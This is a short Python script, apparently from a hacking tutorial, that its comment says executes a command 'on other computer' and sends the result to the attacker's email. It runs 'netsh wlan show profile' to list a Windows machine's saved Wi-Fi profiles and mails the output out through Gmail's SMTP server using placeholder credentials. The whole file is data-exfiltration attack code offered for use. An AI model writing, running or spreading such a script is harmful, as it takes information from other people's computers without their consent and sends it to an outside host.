#!/usr/bin/env python
#execute command on other computer, sends result to your email, need to let less secure apps access gmail account

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    #               from, to, message
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
send_mail("email@gmail.com", "password", result)
